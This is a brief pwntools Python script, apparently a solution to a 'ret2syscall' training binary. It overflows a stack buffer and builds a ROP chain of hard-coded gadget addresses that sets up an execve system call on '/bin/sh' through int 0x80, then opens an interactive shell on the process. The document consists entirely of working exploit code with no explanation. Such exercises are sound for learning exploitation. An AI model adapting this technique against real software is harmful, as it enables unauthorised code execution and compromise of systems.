from pwn import *
p = process("./ret2syscall")
int80_addr = 0x0806f230
bin_sh_addr = 0x080BE408
eax_addr = 0x080bb196
edx_ecx_ebx_addr = 0x0806eb90
payload = b"a"*112 + p32(eax_addr) + p32(0xb)
payload += p32(edx_ecx_ebx_addr) + p32(0) + p32(0) + p32(bin_sh_addr)
payload += p32(int80_addr)
p.sendline(payload)
p.interactive()
